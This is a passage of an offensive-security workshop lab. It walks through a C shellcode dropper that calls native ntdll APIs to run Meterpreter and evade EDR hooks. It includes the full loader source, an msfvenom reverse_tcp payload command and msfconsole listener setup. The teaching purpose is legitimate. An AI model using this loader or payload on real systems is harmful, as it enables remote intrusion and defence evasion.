## Exercise 3: Medium_Level_API-Native Dropper
In this exercise we will make the first modification to the Win32 dropper, replacing the Windows APIs (kernel32.dll) with native APIs (ntdll.dll). We will create a **medium-level API shellcode dropper** and call it a native dropper.
![medium_level_dropper_principal](https://user-images.githubusercontent.com/50073731/235372969-4d24ddec-7ee5-443e-966a-24b3d70dc3a8.png)



## Exercice 3 tasks:
### Creating the Native Dropper
1. Download the native dropper POC from the Code section of this chapter.
2. The code in the POC is partially complete. Following the instructions in this playbook, you need to finish the part where the four native functions are loaded from ntdll.dll. 
3. Then create x64 meterpreter shellcode and copy it into the POC.  
4. Compile the POC as a x64 release. 
5. Create and run a staged x64 meterpreter listener using msfconsole.
6. Run your compiled .exe and check that a stable command and control channel opens. 
### Analysing the Native Dropper
6. Use the Visual Studio **dumpbin** tool to analyse the native dropper. Are any Win32 APIs being imported from kernel32.dll? Is the result what you expected?  
7. Use **x64dbg** to debug or analyse the dropper. 
     - Check which Win32 APIs and native APIs are being imported. If they are being imported, from which module or memory location are they being imported? Is the result what you expected?
     - Check from which module or memory location the syscalls for the four APIs used are being executed. Is the result what you expected? 


## Visual Studio
You can download the POC from the code section of this chapter. In this POC, we replace all the Win32 APIs we used before with the corresponding native function or API.
- For memory allocation, we replace the Windows API VirtualAlloc with the native API **NtAllocateVirtualMemory**.
- For shellcode copying, we replace the Windows API WriteProcessMemory with the native API **NtWriteVirtualMemory**.
- For shellcode execution, we replace the Windows API CreateThread with the native API **NtCreateThreadEx**.
- And finally we have to replace the Windows API WaitForSingleObject with the native API **NtWaitForSingleObject**.

The code works as follows. Unlike the Windows APIs, most of the native APIs are not officially or partially documented by Microsoft and are therefore not intended for Windows OS developers. To use the native APIs in our Native Dropper, we need to manually define the function pointers for the native APIs. This part is already fully implemented in the Native Dropper POC.
<details>
    
 ```
 // Define function pointers for native API functions
typedef NTSTATUS(WINAPI* PNTALLOCATEVIRTUALMEMORY)(HANDLE, PVOID*, ULONG_PTR, PSIZE_T, ULONG, ULONG);
typedef NTSTATUS(NTAPI* PNTWRITEVIRTUALMEMORY)(HANDLE, PVOID, PVOID, SIZE_T, PSIZE_T);
typedef NTSTATUS(NTAPI* PNTCREATETHREADEX)(PHANDLE, ACCESS_MASK, PVOID, HANDLE, PVOID, PVOID, ULONG, SIZE_T, SIZE_T, SIZE_T, PVOID);
typedef NTSTATUS(NTAPI* PNTWAITFORSINGLEOBJECT)(HANDLE, BOOLEAN, PLARGE_INTEGER);
 ```
</details>
    
    
Shellcode declaration same as before in the Win32 Dropper.
<details>

```
// Insert the Meterpreter shellcode as an array of unsigned chars (replace the placeholder with actual shellcode)
    unsigned char code[] = "\xfc\x48\x83";
```
</details>


To load the native functions directly from ntdll.dll, we need to load them manually from ntdll.dll. This code part is not finished and must be completed by the workshop attendee. In the native dropper POC you will see, that the code for the native function ``NtAllocateVirtualMemory`` is already written and based on that schema you have to complete it for the other three native functions ``NtWriteVirtualMemory``, ``NtCreateThreadEx`` and ``NtWaitForSingleObject``.
<details>
    
```
// Load native API functions from ntdll.dll
    PNTALLOCATEVIRTUALMEMORY NtAllocateVirtualMemory = (PNTALLOCATEVIRTUALMEMORY)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtAllocateVirtualMemory");    
```    
     
</details>    

<details>
    <summary>Solution</summary>
If it was at this time not possible for you to complete the code for the three missing native functions, you can use the following code and copy it into the Native Dropper POC. 

```
// Load native API functions from ntdll.dll
    PNTALLOCATEVIRTUALMEMORY NtAllocateVirtualMemory = (PNTALLOCATEVIRTUALMEMORY)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtAllocateVirtualMemory");
    PNTWRITEVIRTUALMEMORY NtWriteVirtualMemory = (PNTWRITEVIRTUALMEMORY)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtWriteVirtualMemory");
    PNTCREATETHREADEX NtCreateThreadEx = (PNTCREATETHREADEX)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtCreateThreadEx");
    PNTWAITFORSINGLEOBJECT NtWaitForSingleObject = (PNTWAITFORSINGLEOBJECT)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtWaitForSingleObject");
```        

</details>     
     
     
Here is the **complete code**, but you can also find it already implemented in the code POC of this chapter.
<details>
    
```
#include <stdio.h>
#include <windows.h>
#include <winternl.h>

// Define function pointers for native API functions
typedef NTSTATUS(WINAPI* PNTALLOCATEVIRTUALMEMORY)(HANDLE, PVOID*, ULONG_PTR, PSIZE_T, ULONG, ULONG);
typedef NTSTATUS(NTAPI* PNTWRITEVIRTUALMEMORY)(HANDLE, PVOID, PVOID, SIZE_T, PSIZE_T);
typedef NTSTATUS(NTAPI* PNTCREATETHREADEX)(PHANDLE, ACCESS_MASK, PVOID, HANDLE, PVOID, PVOID, ULONG, SIZE_T, SIZE_T, SIZE_T, PVOID);
typedef NTSTATUS(NTAPI* PNTWAITFORSINGLEOBJECT)(HANDLE, BOOLEAN, PLARGE_INTEGER);
typedef NTSTATUS(NTAPI* PNTCLOSE)(HANDLE);
typedef NTSTATUS(NTAPI* PNTFREEVIRTUALMEMORY)(HANDLE, PVOID*, PSIZE_T, ULONG);


int main() {

    // Insert the Meterpreter shellcode as an array of unsigned chars (replace the placeholder with actual shellcode)
    unsigned char code[] = "\xfc\x48\x83...";

    // Load native API functions from ntdll.dll
    PNTALLOCATEVIRTUALMEMORY NtAllocateVirtualMemory = (PNTALLOCATEVIRTUALMEMORY)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtAllocateVirtualMemory");
    PNTWRITEVIRTUALMEMORY NtWriteVirtualMemory = (PNTWRITEVIRTUALMEMORY)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtWriteVirtualMemory");
    PNTCREATETHREADEX NtCreateThreadEx = (PNTCREATETHREADEX)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtCreateThreadEx");
    PNTWAITFORSINGLEOBJECT NtWaitForSingleObject = (PNTWAITFORSINGLEOBJECT)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtWaitForSingleObject");
    PNTCLOSE NtClose = (PNTCLOSE)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtClose");
    PNTFREEVIRTUALMEMORY NtFreeVirtualMemory = (PNTFREEVIRTUALMEMORY)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtFreeVirtualMemory");


    // Allocate Virtual Memory with PAGE_EXECUTE_READWRITE permissions to store the shellcode
    // 'exec' will hold the base address of the allocated memory region
    void* exec = NULL;
    SIZE_T size = sizeof(code);
    NtAllocateVirtualMemory(GetCurrentProcess(), &exec, 0, &size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    // Copy the shellcode into the allocated memory region
    SIZE_T bytesWritten;
    NtWriteVirtualMemory(GetCurrentProcess(), exec, code, sizeof(code), &bytesWritten);

    // Execute the shellcode in memory using a new thread
    // Pass the address of the shellcode as the thread function (StartRoutine) and its parameter (Argument)
    HANDLE hThread;
    NtCreateThreadEx(&hThread, GENERIC_EXECUTE, NULL, GetCurrentProcess(), exec, exec, FALSE, 0, 0, 0, NULL);

    // Wait for the end of the thread to ensure the shellcode execution is complete
    NtWaitForSingleObject(hThread, FALSE, NULL);

    // Return 0 as the main function exit code
    return 0;

}
```
</details>

    
## Meterpreter Shellcode
Again, we will create our meterpreter shellcode with msfvenom in Kali Linux. To do this, we will use the following command and create x64 staged meterpreter shellcode.
<details>
    
 **kali>**   
```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=IPv4_Redirector_or_IPv4_Kali LPORT=80 -f c > /tmp/shellcode.txt
```
<p align="center">
<img width="696" alt="image" src="https://user-images.githubusercontent.com/50073731/235358025-7267f8c6-918e-44e9-b767-90dbd9afd8da.png">
</p>

The shellcode can then be copied into the Medium-Level-Dropper poc by replacing the placeholder at the unsigned char, and the poc can be compiled as an x64 release.<p align="center">
<img width="479" alt="image" src="https://user-images.githubusercontent.com/50073731/235414557-d236582b-5bab-4754-bd12-5f7817660c3a.png">
</p>
</details>    


## MSF-Listener
Before we test the functionality of our Medium-Level-Dropper, we need to create a listener within msfconsole.
<details>
    
**kali>**
```
msfconsole
```
**msf>**
```
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set lhost IPv4_Redirector_or_IPv4_Kali
set lport 80 
set exitonsession false
run
```
<p align="center">
<img width="510" alt="image" src="https://user-images.githubusercontent.com/50073731/235358630-09f70617-5f6e-4f17-b366-131f8efe19d7.png">
</p>
</details>
 
    
Once the listener has been successfully started, you can run your compiled Medium-Level-Dropper.exe. If all goes well, you should see an incoming command and control session. 
<details>
    
<p align="center">
<img width="674" alt="image" src="https://user-images.githubusercontent.com/50073731/235369228-84576762-b3b0-4cf7-a265-538995d42c40.png">
</p>
</details>


## Native Dropper analysis: dumpbin 
The Visual Studio tool dumpbin can be used to check which Windows APIs are imported via kernel32.dll. The following command can be used to check the imports. Which results do you expect?
<details>    
    
**cmd>**
```
cd C:\Program Files (x86)\Microsoft Visual Studio\2019\Community
dumpbin /imports medium_level.exe
```
</details>    

<details>
    <summary>Solution</summary>    
Compared to the High-Level-Dropper, you can see that the medium-level dropper **no longer imports** the Windows APIs VirtualAlloc, WriteProcessMemory, CreateThread, and WaitForSingleObject from kernel32.dll. This was expected and is correct.
<p align="center">
<img width="729" alt="image" src="https://user-images.githubusercontent.com/50073731/235374656-117e0468-cd4d-4832-afb7-599cf94d2f1b.png">
</p>
</details>    

     
     
## Native Dropper analysis: x64dbg
The first step is to run your native dropper, check that the .exe is running and that a stable meterpreter C2 channel is open. 
Then we open x64dbg and attach to the running process, note that if you open the native dropper directly in x64dbg you need to run the assembly first.
<details>
<p align="center">
<img width="800" alt="image" src="https://github.com/VirtualAlllocEx/DEFCON-31-Syscalls-Workshop/assets/50073731/a8509e63-ddea-4dee-894f-b2266bb3e504">
</p>
<p align="center">
<img width="800" alt="image" src="https://github.com/VirtualAlllocEx/DEFCON-31-Syscalls-Workshop/assets/50073731/be7fcea9-cac7-4aa6-8e59-d7170e63a1d5">     
</p>            
</details>    


First we want to check which APIs (Win32 or Native) or if the correct APIs are being imported and from which module or memory location. 
Remember that no direct syscalls or similar are used in the Win32 dropper. What results do you expect?
     
<details>
    <summary>Solution</summary>
Checking the imported symbols in our Win32 dropper, we should see that the Win32 APIs VirtualAlloc, WriteProcessMemory, CreateThread and WaitForSingleObject are imported from kernel32.dll. So the result is the same as with dumpbin and seems to be valid.     
<p align="center">
<img width="800" alt="image" src="https://github.com/VirtualAlllocEx/DEFCON-31-Syscalls-Workshop/assets/50073731/93836da7-aaf0-412d-8871-6cea88b00d83">   
<img width="800" alt="image" src="[https://github.com/VirtualAlllocEx/DEFCON-31-Syscalls-Workshop/assets/50073731/93836da7-aaf0-412d-8871-6cea88b00d83](https://github.com/VirtualAlllocEx/DEFCON-31-Syscalls-Workshop/assets/50073731/facd43e5-6cb6-44b7-b17b-0dfd8faab28a)">
</p>        
We use the "Follow imported address" function in the Symbols tab by right-clicking on one of the four Win32 APIs used, e.g. Virtual Alloc, and we can see that we jump to the location of kernel32.dll.
<p align="center">
<img width="800" alt="image" src="https://github.com/VirtualAlllocEx/DEFCON-31-Syscalls-Workshop/assets/50073731/55b64891-6e31-4f1b-b566-30489fb41c7b">
</p>
In the next step we use the function Follow in Dissassembler to follow the memory address that jumps to the memory of the kernelbase.dll.  
<p align="center">
<img width="800" alt="image" src="https://github.com/VirtualAlllocEx/DEFCON-31-Syscalls-Workshop/assets/50073731/fa540f58-b748-45c7-9ee0-4f55821709f7">
</p> 
<p align="center">
<img width="800" alt="image" src="https://github.com/VirtualAlllocEx/DEFCON-31-Syscalls-Workshop/assets/50073731/992e3162-84cc-480b-ade9-e17d6541ba48">
</p>
Then we use the Follow in dissassembler function again and follow the address that calls the native function Nt* or ZwAllocateVirtualMemory from a memory location in ntdll.dll      
<p align="center">
<img width="800" alt="image" src="https://github.com/VirtualAlllocEx/DEFCON-31-Syscalls-Workshop/assets/50073731/667441cb-d9ae-43d3-969e-35be8dbab5da">
</p>        
<p align="center">
<img width="800" alt="image" src="https://github.com/VirtualAlllocEx/DEFCON-31-Syscalls-Workshop/assets/50073731/456e8c76-32bc-4115-8154-61630a8e87c5">
</p>
As expected, we go the normal way via ``malware.exe`` -> ``kernel32.dll`` -> ``kernelbase.dll`` -> ``ntdll.dll`` -> ``syscall``.     
</details>     

We also want to check from which module or memory location the syscall stub of the native functions used is implemented, and also check from which module or memory location the syscall statement and return statement are executed.
<details>
    <summary>Solution</summary>
     The following illustration shows, that the syscall instruction and the return instruction are executed from a memory region in ntdll.dll as expected.          
<p align="center">
<img width="800" alt="image" src="https://github.com/VirtualAlllocEx/DEFCON-31-Syscalls-Workshop/assets/50073731/0701e142-1dd8-4a18-91f8-bf32d6b66315">          
</p>            
</details>     

     
     



## Summary: Medium-level API Dropper
- We made the transition from high-level APIs to medium-level APIs, or from Windows APIs to native APIs.
- But still no direct use of system calls
- Syscall execution via medium_level_dropper.exe -> ntdll.dll -> syscall
- Dropper no longer imports Windows APIs from kernel32.dll
- In case of EDR would only hook kernel32.dll -> EDR bypassed 
